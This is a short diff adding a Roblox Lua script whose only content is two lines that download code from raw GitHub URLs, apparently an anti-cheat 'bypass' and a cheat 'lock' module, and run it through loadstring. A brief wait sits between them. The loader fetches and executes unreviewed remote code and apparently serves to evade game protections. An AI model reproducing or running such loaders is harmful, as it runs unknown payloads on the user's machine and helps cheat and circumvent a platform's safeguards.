@@ -1,0 +1,6 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Empire4946/NossBypassed/main/Bypassers/WinterTimeBypass.txt",true))()
+ 
+
+task.wait(1) --// Render_Safety_Yield;
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Nosssa/NossLock/main/IndexWinterMAIN', true))();
